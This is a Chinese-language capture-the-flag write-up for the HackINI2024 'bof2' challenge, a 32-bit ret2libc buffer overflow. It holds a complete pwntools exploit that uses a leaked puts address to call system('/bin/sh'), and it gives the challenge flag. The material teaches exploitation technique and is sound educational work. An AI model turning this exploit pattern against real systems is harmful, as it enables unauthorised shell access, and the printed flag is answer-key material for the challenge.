# HackINI2024 bof2

## 题目简述

题目是 32 位 ret2libc。程序仍使用 `gets()` 造成返回地址覆盖，但不再提供 `get_flag()`；作为提示，服务会输出运行时 `puts` 地址，并附带与远端一致的 `libc.so.6`。目标是由泄露计算 libc 基址，调用 `system("/bin/sh")`。

## 解题过程

程序启动时执行：

```c
printf("Gift for ya: %p\n", puts);
```

设泄露地址为 $L$，附带 libc 中 `puts` 的符号偏移为 $O_{puts}$，则：

$$
\text{libc\_base}=L-O_{puts}
$$

随后从同一 libc 中取得 `system` 和字符串 `/bin/sh\0` 的运行时地址。附件二进制中，从缓冲区到保存返回地址的偏移为 76。32 位 cdecl 调用栈应依次放置 `system` 地址、伪返回地址和第一个参数：

```python
from pwn import *

context.arch = "i386"
elf = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
io = process(elf.path)

io.recvuntil(b"Gift for ya: ")
puts_leak = int(io.recvline().strip(), 16)
libc.address = puts_leak - libc.sym.puts

bin_sh = next(libc.search(b"/bin/sh\x00"))
payload = flat(
    b"A" * 76,
    libc.sym.system,
    0x41414141,
    bin_sh,
)

io.sendlineafter(b"Enter your name: ", payload)
io.interactive()
```

取得 shell 后读取 `flag.txt`：

```text
shellmates{YOU_CaN_D0_4_loT_W1tH_R3t_2_liBc}
```

## 方法总结

ret2libc 需要泄露值、匹配的 libc 和正确调用约定三者一致。地址随机化只改变装载基址，不改变同一 libc 内的符号偏移；用已知函数地址减去静态偏移即可恢复基址。32 位函数参数位于栈上，所以 `system` 后必须保留一个返回地址槽，再放入 `/bin/sh` 指针。
